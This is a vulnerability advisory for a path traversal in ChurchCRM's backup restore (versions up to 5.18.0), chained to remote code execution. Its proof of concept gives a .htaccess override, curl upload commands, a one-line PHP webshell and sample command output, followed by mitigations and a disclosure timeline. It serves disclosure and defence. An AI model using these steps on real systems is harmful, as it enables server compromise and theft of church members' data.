# ChurchCRM — Path Traversal to Remote Code Execution via Backup Restore (<= 5.18.0)

**Disclosure status:** Reported to vendor (GitHub Security Advisory GHSA-r6cr-mvr9-f6wx). No vendor response after 2+ weeks. Potentially addressed in v5.19.0 without acknowledgment.

**Affected product**
- ChurchCRM — versions **<= 5.18.0**

**Summary**
A path traversal vulnerability in ChurchCRM's backup restore functionality allows authenticated administrators to upload arbitrary files to the server filesystem. By exploiting this to upload malicious `.htaccess` files, attackers can override Apache configuration and achieve remote code execution through subsequent PHP webshell uploads.

**Required privileges**
- Authenticated administrator account with backup restore permissions

**Impact**
- Remote Code Execution (as web server user)
- Complete server compromise with web server privileges
- Access to all application data including sensitive church member information
- Potential for persistent backdoor installation and lateral movement

**Technical Details**
The vulnerability exists in `src/ChurchCRM/Backup/RestoreJob.php` at line 43 where user-supplied filenames from file uploads are directly concatenated into file paths without validation:

```php
$this->RestoreFile = new \SplFileInfo($this->TempFolder . '/' . $rawUploadedFile['name']);
move_uploaded_file($rawUploadedFile['tmp_name'], $this->RestoreFile);
```

The `$rawUploadedFile['name']` parameter is user-controlled, allowing upload of files with arbitrary names to `/var/www/html/tmp_attach/ChurchCRMBackups/`. This directory is typically web-accessible, enabling direct execution of uploaded content.

**Attack Chain**
1. **Path Traversal**: Upload malicious `.htaccess` file to override Apache PHP execution restrictions
2. **Configuration Override**: Malicious `.htaccess` allows PHP execution in upload directory
3. **Webshell Upload**: Upload PHP webshell through same vulnerable endpoint
4. **Remote Code Execution**: Execute arbitrary commands via uploaded webshell

**Proof-of-Concept**

1. Authenticate as administrator and obtain session cookie

2. Create malicious `.htaccess` file to enable PHP execution:
   ```apache
   <Files "*.php">
       Order Allow,Deny
       Allow from all
   </Files>
   ```

3. Upload `.htaccess` via backup restore endpoint:
   ```bash
   curl 'http://[target]/api/database/restore' \
     -H 'Cookie: CRM-[session-id]=[session-value]' \
     -F 'restoreFile=@.htaccess'
   ```

4. Upload PHP webshell:
   ```bash
   curl 'http://[target]/api/database/restore' \
     -H 'Cookie: CRM-[session-id]=[session-value]' \
     -F 'restoreFile=@webshell.php'
   ```
   
   Where `webshell.php` contains:
   ```php
   <?php system($_GET['cmd']); ?>
   ```

5. Execute arbitrary commands:
   ```bash
   curl 'http://[target]/tmp_attach/ChurchCRMBackups/webshell.php?cmd=whoami'
   # Response: www-data
   
   curl 'http://[target]/tmp_attach/ChurchCRMBackups/webshell.php?cmd=id'
   # Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

**Confirmed results (observed)**
- Successful upload of `.htaccess` file to override security restrictions
- Successful upload and execution of PHP webshell
- Remote command execution confirmed with system commands
- Full web server user access to filesystem and application data

**Mitigation / Workarounds**
- **Immediate**: Restrict backup restore functionality to trusted administrators only
- **Recommended vendor fixes**:
  - Implement strict filename validation and sanitization
  - Use allowlist of permitted file extensions for backup files
  - Store uploaded files outside web-accessible directories
  - Implement proper file type validation beyond filename checking
  - Add CSRF protection to backup restore endpoints

**Disclosure timeline**
- 2025-09-26 — Reported via GitHub Security Advisory GHSA-r6cr-mvr9-f6wx
- 2025-10-05 — ChurchCRM v5.19.0 released with unspecified security improvements
- 2025-10-08 — No vendor response received; publishing advisory for CVE coordination

**References**
- GitHub Security Advisory: GHSA-r6cr-mvr9-f6wx
- ChurchCRM Backup Restore: `src/ChurchCRM/Backup/RestoreJob.php:43`

**Contact**
- Reporter: uartu0@gmail.com

---

This advisory documents an authenticated path traversal vulnerability that can be chained with Apache configuration manipulation to achieve remote code execution. While requiring administrator privileges, the impact includes full server compromise and access to sensitive church member data stored in the application.
